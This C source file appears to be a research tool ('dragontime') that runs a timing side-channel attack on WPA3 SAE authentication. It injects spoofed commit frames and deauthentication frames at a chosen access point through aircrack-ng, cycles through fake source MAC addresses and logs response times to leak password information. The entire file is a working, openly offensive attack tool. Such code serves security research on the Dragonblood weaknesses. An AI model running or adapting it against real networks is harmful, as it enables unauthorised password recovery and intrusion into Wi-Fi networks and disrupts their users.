#include <err.h>
#include <poll.h>
#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/timerfd.h>
#include <sys/stat.h>
#include <openssl/ec.h>
#include <aircrack-ng/osdep/osdep.h>

#include "dragontime.h"
#include "utils.h"

static struct state *get_state(void) {
	return &_state;
}

static int get_group(const int group_id, unsigned char *buf) {
	int len;
	unsigned char *group;

	switch (group_id) {
		case 22:
			len = AUTH_REQ_SAE_COMMIT_GROUP_22_SIZE;
			group = AUTH_REQ_SAE_COMMIT_GROUP_22;
			break;
		case 23:
			len = AUTH_REQ_SAE_COMMIT_GROUP_23_SIZE;
			group = AUTH_REQ_SAE_COMMIT_GROUP_23;
			break;
		case 24:
			len = AUTH_REQ_SAE_COMMIT_GROUP_24_SIZE;
			group = AUTH_REQ_SAE_COMMIT_GROUP_24;
			break;
		default:
			return 0;
	}

	memcpy(buf, group, len);
	return len;
}

void send_anti_clogging(struct state *state, const unsigned char *buf, const int len) {
	const unsigned char *token = buf + 24 + 8;
	const int token_len = len - 24 - 8;
	unsigned char reply[2048] = {0};
	int reply_len = 0;

	/* fill in basic frame */
	reply_len = get_group(state->group, reply);

	/* token comes after status and group id, before scalar and element */
	const int pos = 24 + 8;
	memmove(reply + pos + token_len, reply + pos, reply_len - pos);
	memcpy(reply + pos, token, token_len);
	reply_len += token_len;

	/* set addresses */
	memcpy(reply + 4, state->bssid, 6);
	memcpy(reply + 10, buf + 4, 6);
	memcpy(reply + 16, state->bssid, 6);

	if (card_write(state, reply, reply_len) == -1)
		perror("card_write");
	clock_gettime(CLOCK_MONOTONIC, &state->prev_commit);
}

static void card_open(struct state *state, char *dev) {
	printf("Opening card %s\n", dev);
	if ((state->wi = wi_open(dev)) == NULL)
		err(1, "wi_open()");
	if (wi_set_channel(state->wi, 1) == -1)
		err(1, "card_set_chan()");
}

static int card_write(const struct state *state, void *buf, const int len) {
	return wi_write(state->wi, NULL, 0, buf, len, NULL);
}

static int card_receive(struct state *state) {
	unsigned char buf[2048];
	int len;
	struct rx_info ri;

	if ((len = wi_read(state->wi, NULL, 0, buf, sizeof(buf), &ri)) < 0) {
		fprintf(stderr, "Failed to read packet\n");
		return -1;
	}

	process_packet(state, buf, len);
	return len;
}

static void copy_header(const struct state *state, unsigned char *buf) {
	memcpy(buf + 4, state->bssid, 6);
	memcpy(buf + 10, state->srcaddr, 6);
	memcpy(buf + 16, state->bssid, 6);
}

static void inject_sae_commit(struct state *state) {
	if (!state->started_attack)
		return;

	unsigned char buf[2048] = {};
	const int len = get_group(state->group, buf);
	copy_header(state, buf);

	if (card_write(state, buf, len) == -1)
		perror("card_write");

	clock_gettime(CLOCK_MONOTONIC, &state->prev_commit);
}

static void inject_deauth(const struct state *state) {
	unsigned char *buf = DEAUTH_FRAME;
	copy_header(state, buf);

	if (card_write(state, buf, DEAUTH_FRAME_SIZE) == -1)
		perror("card_write");
}

static void queue_next_commit(const struct state *state) {
	struct itimerspec timespec = {};
	timespec.it_value.tv_nsec = state->delay * 1000 * 1000;

	if (timerfd_settime(state->time_fd_inject, 0, &timespec, NULL) == -1)
		perror("timerfd_settime()");
}

static void calc_prev_commit_diff(const struct state *state, struct timespec *diff) {
	struct timespec curr;
	clock_gettime(CLOCK_MONOTONIC, &curr);

	if (curr.tv_nsec > state->prev_commit.tv_nsec) {
		diff->tv_nsec = curr.tv_nsec - state->prev_commit.tv_nsec;
		diff->tv_sec = curr.tv_sec - state->prev_commit.tv_sec;
	} else {
		diff->tv_nsec = curr.tv_nsec - state->prev_commit.tv_nsec + 1000 * 1000 * 1000;
		diff->tv_sec = curr.tv_sec - state->prev_commit.tv_sec - 1;
	}
}

static void process_packet(struct state *state, const unsigned char *buf, const int len) {
	/* Ignore retransmitted frames */
	if (is_retransmitted(buf)) return;

	/* Sent by AP */
	if (memcmp(get_bssid_from_packet(buf), state->bssid, 6) != 0 ||
	    memcmp(get_src_from_packet(buf), state->bssid, 6) != 0)
		return;

	/* Start Timing Attack */
	if (is_beacon(buf) && !state->started_attack) {
		printf("Detected AP! Starting timing attack\n");
		fprintf(state->fp, "Starting\n");

		state->started_attack = 1;
		inject_sae_commit(state);
	}

	/* Detect Authentication frames */
	if (is_authentication(buf, len)) {
		/* Status is good */
		if (is_status_ok(buf)) {
			struct timespec diff;
			calc_prev_commit_diff(state, &diff);

			state->sum_time[state->curraddr] += diff.tv_nsec;
			state->num_injected[state->curraddr] += 1;

			// Write measurement to file
			fprintf(state->fp, "STA %02X: %ld\n", state->curraddr, diff.tv_nsec / 1000);

			// Also provide output to the screen
			printf("STA %02X: %ld miliseconds (TOTAL %d)\n", state->curraddr, diff.tv_nsec / 1000,
			       state->num_injected[state->curraddr]);
			if (state->curraddr == 0 && state->num_injected[state->num_addresses - 1] > 0) {
				printf("-------------------------------\n");
				for (int i = 0; i < state->num_addresses; ++i)
					printf("Address %02X = %ld\n", i, state->sum_time[i] / (state->num_injected[i] * 1000));
			}

			inject_deauth(state);

			state->curraddr = (state->curraddr + 1) % state->num_addresses;
			state->srcaddr[5] = state->curraddr;
			queue_next_commit(state);
		}

		/* Status equals Anti-Clogging Token Required */
		else if (is_status_clogged(buf)) {
			send_anti_clogging(state, buf, len);
		}

		/* Status equals unsupported group */
		else if (is_status_unsupported(buf)) {
			printf("WARNING: Authentication rejected due to unsupported group\n");
		}

		/* Unrecognized */
		else {
			printf("WARNING: Unrecognized status 0x%02X 0x%02X\n", buf[28], buf[29]);
		}
	}
}

static void check_timeout(const struct state *state) {
	if (!state->started_attack)
		return;

	struct timespec diff;
	calc_prev_commit_diff(state, &diff);

	if (diff.tv_nsec > state->timeout * 1000 * 1000) {
		inject_deauth(state);
		queue_next_commit(state);
	}
}

static void print_initial_info(FILE *fp, const struct state *state) {
	fprintf(fp, "BSSID %02X:%02X:%02X:%02X:%02X:%02X\n", state->bssid[0], state->bssid[1], state->bssid[2],
	        state->bssid[3], state->bssid[4], state->bssid[5]);
	fprintf(fp, "Spoofing %02X:%02X:%02X:%02X:%02X:[00-%02X]\n", state->srcaddr[0], state->srcaddr[1],
	        state->srcaddr[2], state->srcaddr[3], state->srcaddr[4], state->num_addresses - 1);
	fprintf(fp, "Group %d\n", state->group);
	fprintf(fp, "Timeout %d\n", state->timeout);
	fprintf(fp, "Delay %d\n", state->delay);
}

static void event_loop(struct state *state, char *dev) {
	struct pollfd fds[3];
	struct itimerspec timespec;

	// 1. Open the card and get the MAC address
	card_open(state, dev);
	wi_set_rate(state->wi, USED_RATE);
	wi_get_mac(state->wi, state->srcaddr);

	// 2. Display all info we need to perform the dictionary attack & also write it to file
	print_initial_info(stdout, state);
	print_initial_info(state->fp, state);

	// 3. Initialize further things to start the attack
	state->srcaddr[5] = state->curraddr;

	// 4. Initialize periodic timer to detect timeouts
	const int timer_fd = timerfd_create(CLOCK_MONOTONIC, 0);
	if (timer_fd == -1)
		perror("timerfd_create()");

	/* initial expiration of the timer */
	timespec.it_value.tv_sec = 1;
	timespec.it_value.tv_nsec = 0;
	/* periodic expiration of the timer */
	timespec.it_interval.tv_sec = 0;
	timespec.it_interval.tv_nsec = 100 * 1000 * 1000;

	// 5. Initialize timer used to queue a new commit frame to inject
	if (timerfd_settime(timer_fd, 0, &timespec, NULL) == -1)
		perror("timerfd_settime()");

	state->time_fd_inject = timerfd_create(CLOCK_MONOTONIC, 0);
	if (state->time_fd_inject == -1)
		perror("timerfd_create()");

	// 6. Now start the main event loop
	printf("Searching for AP ...\n");
	while (1) {
		const int card_fd = wi_fd(state->wi);

		memset(&fds, 0, sizeof(fds));
		fds[0].fd = card_fd;
		fds[0].events = POLLIN;
		fds[1].fd = timer_fd;
		fds[1].events = POLLIN;
		fds[2].fd = state->time_fd_inject;
		fds[2].events = POLLIN;

		if (poll(fds, 3, -1) == -1)
			err(1, "poll()");

		if (fds[0].revents & POLLIN)
			card_receive(state);

		// TODO - do we really need timeout?
		// This timer is periodically called, detects timeouts, and implicity starts the attack
		if (fds[1].revents & POLLIN) {
			uint64_t exp;
			assert(read(timer_fd, &exp, sizeof(uint64_t)) == sizeof(uint64_t));
			check_timeout(state);
		}

		// This timer is set when a new commit is queued after receiving a reply or a timeout
		if (fds[2].revents & POLLIN) {
			uint64_t exp;
			assert(read(state->time_fd_inject, &exp, sizeof(uint64_t)) == sizeof(uint64_t));
			inject_sae_commit(state);
		}
	}
}

static void sighandler(int signum) {
	const struct state *state = get_state();

	if (signum == SIGPIPE || signum == SIGINT) {
		const time_t t = time(NULL);
		const struct tm tm = *localtime(&t);

		fprintf(state->fp != NULL ? state->fp : stdout, "Stopping at %d-%02d-%02d %02d:%02d:%02d\n", tm.tm_year + 1900,
		        tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);

		exit(0);
	}
}

int main(const int argc, char *argv[]) {
	char *device = NULL;
	int ch;
	struct state *state = get_state();

	unsigned int seed;
	FILE *urandom = fopen("/dev/urandom", "r");
	if (urandom) {
		fread(&seed, sizeof(seed), 1, urandom);
		fclose(urandom);
	} else {
		seed = time(NULL); // Fallback in case /dev/urandom is not available
	}
	srand(seed);

	memset(state, 0, sizeof(*state));
	state->curraddr = 0;
	state->group = 24;
	state->delay = 250;
	state->timeout = 750;
	state->num_addresses = 20;

	while ((ch = getopt(argc, argv, "d:a:g:i:t:o:")) != -1) {
		switch (ch) {
			case 'g':
				state->group = atoi(optarg);
				if (state->group < 22 || state->group > 24) {
					printf("Invalid group. Can only attack groups 22, 23, 24.\n");
					return 1;
				}

			case 'd':
				device = optarg;
				break;

			case 'a':
				if (get_mac(optarg, 1, state->bssid) != 0) {
					printf("Invalid AP MAC address.\n");
					return 1;
				}
				break;

			case 'i':
				state->delay = atoi(optarg);
				if (state->delay < 1) {
					printf("Please enter an delay above zero\n");
					return 1;
				}
				break;

			case 't':
				state->timeout = atoi(optarg);
				if (state->timeout < 1) {
					printf("Please enter a timeout above zero\n");
					return 1;
				}
				break;

			case 'o':
				state->output_file = strdup(optarg);
				break;

			default:
				break;
		}
	}

	signal(SIGPIPE, sighandler);
	signal(SIGINT, sighandler);

	if (state->output_file == NULL) {
		fprintf(stderr, "Please provide an output file using the -o parameter\n");
		exit(1);
	}

	state->fp = fopen(state->output_file, "w");
	if (state->fp == NULL) {
		fprintf(stderr, "Failed to open %s: ", state->output_file);
		perror("");
		exit(1);
	}
	chmod(state->output_file, 0766);

	event_loop(state, device);
	exit(0);
}
